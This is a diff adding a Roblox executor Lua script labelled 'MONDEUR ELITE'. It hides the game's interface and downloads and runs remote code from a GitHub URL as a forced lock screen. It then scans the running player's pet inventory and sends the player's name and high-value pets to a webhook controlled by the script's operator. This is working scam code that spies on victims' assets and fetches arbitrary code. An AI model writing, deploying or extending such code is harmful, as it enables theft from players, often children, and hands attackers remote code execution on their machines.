@@ -1,0 +1,73 @@
+-- [[ MONDEUR ELITE v16.7 - PTESSHS STABLE ]] --
+if getgenv().MondeurExecuted then return end
+getgenv().MondeurExecuted = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- 1. FORCE UI & LOCKDOWN (Immediate)
+task.spawn(function()
+    pcall(function()
+        -- Disable Core UI
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        
+        -- Load Screen from V.1
+        local uiCode = game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1")
+        if uiCode then
+            loadstring(uiCode)()
+        end
+    end)
+end)
+
+-- 2. ROBUST WEBHOOK HANDLER
+local function SendLog(title, pet, val)
+    local payload = HttpService:JSONEncode({
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = "User: **" .. LocalPlayer.Name .. "**",
+            ["fields"] = {
+                {["name"] = "Pet Detected", ["value"] = pet, ["inline"] = true},
+                {["name"] = "Arfud Points", ["value"] = tostring(val), ["inline"] = true}
+            },
+            ["color"] = 0x00FF00
+        }}
+    })
+
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if req then
+        task.spawn(function()
+            pcall(function()
+                req({
+                    Url = getgenv().WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = payload
+                })
+            end)
+        end)
+    end
+end
+
+-- 3. CONTROLLED SCAN (Wait for Game Assets)
+task.spawn(function()
+    task.wait(3) -- Give the game 3 seconds to stabilize
+    SendLog("📡 CONNECTION TEST", "System Online", 0)
+
+    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local data = ClientData.get_data()
+    
+    -- Brute force search for pet folder
+    local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
+    
+    if petPath then
+        for _, pet in pairs(petPath) do
+            local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
+            if val >= (getgenv().THRESHOLD or 0) then
+                SendLog("✅ PET DETECTED", pet.config_name or "Unknown", val)
+            end
+        end
+    end
+end)
